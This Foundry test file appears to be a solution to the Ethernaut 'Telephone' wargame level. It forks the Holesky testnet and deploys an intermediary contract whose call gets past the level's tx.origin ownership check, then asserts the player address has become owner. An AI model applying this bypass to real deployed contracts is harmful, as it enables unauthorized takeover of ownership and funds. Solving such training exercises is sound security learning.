// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {Telephone} from "../../src/Ethernaut/Telephone.sol";

contract TelephoneAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress);
        TelephoneDelegate delegate = new TelephoneDelegate();
        delegate.changOwner(playerAddress);
        Telephone telephone = Telephone(
            0x7Ee7C660042e6A5Ce58eD8CE83dbD6429d56c25f
        );
        vm.stopPrank();
        assertTrue(telephone.owner() == playerAddress);
    }
}

contract TelephoneDelegate {
    function changOwner(address _newOwner) public {
        Telephone telephone = Telephone(
            0x7Ee7C660042e6A5Ce58eD8CE83dbD6429d56c25f
        );
        telephone.changeOwner(_newOwner);
    }
}
